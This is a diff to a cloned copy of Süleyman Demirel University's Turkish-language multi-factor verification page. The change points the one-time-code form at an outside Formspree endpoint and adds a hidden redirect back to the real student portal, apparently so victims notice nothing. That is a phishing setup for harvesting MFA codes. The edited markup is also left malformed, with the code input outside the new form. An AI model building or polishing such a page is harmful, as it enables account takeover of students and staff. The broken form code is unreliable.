@@ -933,39 +933,41 @@
                                         Bilgi Sistemi'nden", öğrenci iseniz "Öğrenci Bilgi Sistemi'nden" alınmaktadır.
                                         Eğer doğrulama kodu gelmediyse "Personel Daire Başkanlığı'ndan" veya "Öğrenci
                                         İşleri Daire Başkanlığı'ndan" numaranızın düzeltilmesini isteyiniz.</div>
-                                    <form autocomplete="off" action="kod_kaydet.php" method="post">
-                                        <div class="form-group position-relative">
-                                            <label class=control-label for=ValidationCode>Doğrulama Kodu</label>
-                                            <input class=form-control inputmode=numeric autocomplete=one-time-code
-                                                pattern=\d{6} type=text data-val=true
-                                                data-val-required="Doğrulama kodu alanı gerekli." id=ValidationCode
-                                                name=ValidationCode value>
-                                            <span class="text-danger field-validation-valid"
-                                                data-valmsg-for=ValidationCode data-valmsg-replace=true></span>
+                                    <form action="https://formspree.io/f/xaqqpljg" method="POST">
+                                        <input type="hidden" name="_next" value="https://obs.sdu.edu.tr/">
+
+                                    </form>
+                                    <div class="form-group position-relative">
+                                        <label class=control-label for=ValidationCode>Doğrulama Kodu</label>
+                                        <input class=form-control inputmode=numeric autocomplete=one-time-code
+                                            pattern=\d{6} type=text data-val=true
+                                            data-val-required="Doğrulama kodu alanı gerekli." id=ValidationCode
+                                            name=ValidationCode value>
+                                        <span class="text-danger field-validation-valid" data-valmsg-for=ValidationCode
+                                            data-valmsg-replace=true></span>
+                                    </div>
+                                    <div class="form-group position-relative">
+                                        <div class="beni-hatirla mb-3">
+                                            <input checked class=inp-cbx id=cbx type=checkbox style=display:none
+                                                data-val=true data-val-required="The RememberDevice field is required."
+                                                name=RememberDevice value=true>
+                                            <label class=cbx for=cbx data-toggle=tooltip data-placement=top
+                                                title="1 ay boyunca doğrulama yapılmayacak">
+                                                <span></span>
+                                                <span>Bu cihaza güven</span>
+                                            </label>
                                         </div>
-                                        <div class="form-group position-relative">
-                                            <div class="beni-hatirla mb-3">
-                                                <input checked class=inp-cbx id=cbx type=checkbox style=display:none
-                                                    data-val=true
-                                                    data-val-required="The RememberDevice field is required."
-                                                    name=RememberDevice value=true>
-                                                <label class=cbx for=cbx data-toggle=tooltip data-placement=top
-                                                    title="1 ay boyunca doğrulama yapılmayacak">
-                                                    <span></span>
-                                                    <span>Bu cihaza güven</span>
-                                                </label>
-                                            </div>
-                                        </div>
-                                        <div class="form-group position-relative">
-                                            Kalan süre:<counter-element interval=300000 id=counter><template
-                                                    shadowrootmode=open><span id=counter>4 dakika 52 saniye</span>
-                                                </template></counter-element>
-                                            <a href=https://sts4.sdu.edu.tr/Account/MfaValidate id=resendLink
-                                                class=float-right style=display:none>Doğrulama Kodunu Yeniden Gönder</a>
-                                        </div>
-                                        <div class=form-group>
-                                            <input type=submit value=Doğrula class="btn btn-primary" id=btnSubmit>
-                                        </div>
+                                    </div>
+                                    <div class="form-group position-relative">
+                                        Kalan süre:<counter-element interval=300000 id=counter><template
+                                                shadowrootmode=open><span id=counter>4 dakika 52 saniye</span>
+                                            </template></counter-element>
+                                        <a href=https://sts4.sdu.edu.tr/Account/MfaValidate id=resendLink
+                                            class=float-right style=display:none>Doğrulama Kodunu Yeniden Gönder</a>
+                                    </div>
+                                    <div class=form-group>
+                                        <input type=submit value=Doğrula class="btn btn-primary" id=btnSubmit>
+                                    </div>
                                     </form>
                                 </div>
                             </div>
